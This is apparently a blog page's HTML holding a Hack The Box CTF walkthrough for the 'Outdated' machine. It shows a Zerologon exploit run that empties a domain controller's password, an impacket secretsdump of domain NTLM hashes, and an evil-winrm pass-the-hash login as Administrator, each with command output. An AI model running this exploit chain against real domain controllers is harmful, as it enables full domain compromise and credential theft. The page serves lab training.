@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>
+        Outdated -- HTB walkthrough ::
+        Werz — CyberSecurity
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="Part of this article is encrypted with password:
+  --- DON&#39;T MODIFY THIS LINE --- You cannot see me unless you&amp;rsquo;ve got the password! #  Official box page on HTB #  System Scan | IP: 10.129.15.107 #  let&amp;rsquo;s add the ip to to the /etc/hosts file with the default hostnameoutdated.htb
+ echo &#39;10.129.15.107 late.htb &#39; &amp;gt;&amp;gt; /etc/hosts nmap -Pn 10.129.15.107 -T4
+ werz@ctf01:~/ctf/htb/outdated$ nmap -Pn 10."
+/>
+<meta
+  name="keywords"
+  content="ctf, hackthebox, writeup, htb writeup, walkthrough, retired htb, hack the box, cybersecurtiy, capture the flag"
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://0xwerz.github.io/14/08/2022/outdated/" />
+
+
+
+
+
+<link rel="stylesheet" href="https://0xwerz.github.io/assets/style.css" />
+
+<link rel="stylesheet" href="https://0xwerz.github.io/style.css" />
+
+
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+
+
+<link href="https://0xwerz.github.io/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://0xwerz.github.io/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://0xwerz.github.io/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://0xwerz.github.io/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://0xwerz.github.io/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://0xwerz.github.io/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Outdated -- HTB walkthrough"/>
+<meta name="twitter:description" content="https://app.hackthebox.com/machines/outdated"/>
+
+
+
+<meta property="og:title" content="Outdated -- HTB walkthrough" />
+<meta property="og:description" content="https://app.hackthebox.com/machines/outdated" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://0xwerz.github.io/14/08/2022/outdated/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-08-14T10:12:16+13:00" />
+<meta property="article:modified_time" content="2022-08-14T10:12:16+13:00" /><meta property="og:site_name" content="Werz" />
+
+
+
+
+
+
+  </head>
+  <body class="light-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="https://0xwerz.github.io/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >werz@blog:~$</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/archive">./archive</a></li>
+        
+      
+        
+          <li><a href="/posts">./articles</a></li>
+        
+      
+        
+          <li><a href="/about">./whoami</a></li>
+        
+      
+      
+      
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/archive">./archive</a></li>
+      
+    
+      
+        <li><a href="/posts">./articles</a></li>
+      
+    
+      
+        <li><a href="/about">./whoami</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title">Outdated &ndash; HTB walkthrough</h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2022-08-14
+        </span>
+
+        
+          
+        
+      
+
+      
+
+
+      
+        <span class="post-read-time"
+          >— 2 min read</span
+        >
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          <a href="https://0xwerz.github.io/tags/htb/">#htb</a>&nbsp;
+        
+          <a href="https://0xwerz.github.io/tags/windows/">#windows</a>&nbsp;
+        
+          <a href="https://0xwerz.github.io/tags/medium/">#medium</a>&nbsp;
+        
+          <a href="https://0xwerz.github.io/tags/active/">#active</a>&nbsp;
+        
+      </span>
+    
+
+    
+
+    <div class="post-content">
+      
+      
+
+
+
+<div class="hugo-encryptor-container">
+  <div class="hugo-encryptor-prompt">
+    
+      <p>Part of this article is encrypted with password:</p>
+    
+  </div>
+  <div class="hugo-encryptor-form">
+    <input
+      class="hugo-encryptor-input"
+      placeholder='Please input the password'
+    />
+    <input
+      class="hugo-encryptor-button"
+      type="button"
+      value='Click to verify'
+      onclick="_click_handler(this)"
+    />
+  </div>
+  <div
+    class="hugo-encryptor-cipher-text"
+    data-password="PASSWORD"
+    style="display: none;"
+  >
+    <span style="display: none;">--- DON'T MODIFY THIS LINE ---</span>
+    <h1 id="you-cannot-see-me-unless-youve-got-the-password">
+  You cannot see me unless you&rsquo;ve got the password!
+  <a href="#you-cannot-see-me-unless-youve-got-the-password" class="h-anchor" aria-hidden="true">#</a>
+</h1>
+Official <h3 id="official-box-pagehttpsapphacktheboxcommachinesoutdated-on-htb">
+  <a href="https://app.hackthebox.com/machines/outdated" target="_blank">box page</a>
+ on HTB
+  <a href="#official-box-pagehttpsapphacktheboxcommachinesoutdated-on-htb" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<!-- raw HTML omitted -->
+<h4 id="system-scan--ip-1012915107">
+  System Scan | <strong>IP: 10.129.15.107</strong>
+  <a href="#system-scan--ip-1012915107" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<p>let&rsquo;s add the ip to to the <code>/etc/hosts</code> file with the default hostname<code>outdated.htb</code></p>
+<blockquote>
+<p><code>echo '10.129.15.107    late.htb ' &gt;&gt; /etc/hosts</code>
+nmap -Pn 10.129.15.107 -T4</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">werz@ctf01:~/ctf/htb/outdated$ nmap -Pn 10.129.15.107 -T4
+Nmap scan report <span style="color:#66d9ef">for</span> 10.129.15.107
+PORT      STATE   SERVICE
+25/tcp    open    smtp
+53/tcp    open    domain
+88/tcp    open    kerberos-sec
+135/tcp   open    msrpc
+139/tcp   open    netbios-ssn
+389/tcp   open    ldap
+445/tcp   open    microsoft-ds
+464/tcp   open    kpasswd5
+593/tcp   open    http-rpc-epmap
+636/tcp   open    ldapss1
+3268/tcp  open    globalcatLDAPssl
+5985/tcp  open    wsman
+50006/tcp open    unknown
+</code></pre></div><p>I Believe that the way I&rsquo;ll do is probably a unintended way.</p>
+<p>download <a href="https://github.com/risksense/zerologon" target="_blank">risksense/zerologon</a>
+ and execute it passing it a DC name and the victim IP</p>
+<p>it will take some time:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">werz@ctf01:—/ctf/htb/outdated$ python3 set_empty_pw.py DC 10.129.15.107
+Performing authentication attempts... 
+<span style="color:#f92672">=======</span>
+
+NetrServerAuthenticate3Response
+ServerCredential:
+Data:                            b<span style="color:#e6db74">&#39;\xd7\x93\xa6\x1d\xe7\x1c\xbeut&#39;</span> 
+NegotiateFlags:                  <span style="color:#ae81ff">556793855</span> 
+AccountRid:                      <span style="color:#ae81ff">1002</span>
+ErrorCode:                       <span style="color:#ae81ff">0</span> 
+server challenge b<span style="color:#e6db74">&#39;\xd7\x9b$\x14\xbc\x91\xf7\x83&#39;</span> 
+Net rServerPasswordSet2Response 
+ReturnAuthenticator: 
+Credential: 
+Data:                           b<span style="color:#e6db74">&#39;\x014\x1d\x97\xb078;&#39;</span> 
+Timestamp:                      <span style="color:#ae81ff">0</span> 
+ErrorCode:                      <span style="color:#ae81ff">0</span> 
+
+Success! DC should now have the empty string as its machine password. 
+</code></pre></div><p>so the password has been removed we can dump hashes with impacket <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py" target="_blank">secretdump.py</a>
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">werz@ctf01:~/ctf/htb/outdated$ secretdump.py -just-dc -no-pass <span style="color:#e6db74">&#39;DC$@10.129.15.107&#39;</span>
+Impacket v0.10.0 - Copyright <span style="color:#ae81ff">2022</span> SecureAuth Corporation
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping Domain Credentials <span style="color:#f92672">(</span>domain<span style="color:#ae81ff">\u</span>id:rid:lmhash:nthash<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:716f1ce2e2cf38ee1210cce35eb78cb6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a300e4031093085c7af7ac61a79e6d00:::
+outdated.htb<span style="color:#ae81ff">\b</span>tables:1106:aad3b435b51404eeaad3b435b51404ee:781444163f086fdf8de13de9110ed6e7:::
+outdated.htb<span style="color:#ae81ff">\s</span>flowers:1108:aad3b435b51404eeaad3b435b51404ee:1fcdb1f6015dcb318cc77bb2bda14db5:::
+DC$:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+CLIENT$:1105:aad3b435b51404eeaad3b435b51404ee:c57f6ab8490903d04597f6ff606fc58b:::
+</code></pre></div><p>With the administrator hash we can connect with <a href="https://github.com/Hackplayers/evil-winrm" target="_blank">evil-winrm</a>
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">werz@ctf01:~/ctf/htb/outdated$ evil-winrm -u Administrator -i 10.129.15.107 -H 31d6cfe0d16ae931b73c59d7e0c089c0
+Evil-WinRm shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRm* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt;
+</code></pre></div><p>And we are in :)</p>
+<blockquote>
+<p>it may be patched anytime, I&rsquo;ll post the intented way soon.</p>
+</blockquote>
+
+  </div>
+</div>
+
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h"
+              >Read other posts</span
+            >
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+            
+              <span class="button next">
+                <a href="https://0xwerz.github.io/23/04/2022/late/">
+                  <span class="button__text">Late -- HTB walkthrough</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        
+
+      
+    
+  </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">© 2022 Powered by Hugo</div>
+      
+  </div>
+</footer>
+
+<script src="https://0xwerz.github.io/assets/main.js"></script>
+<script src="https://0xwerz.github.io/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
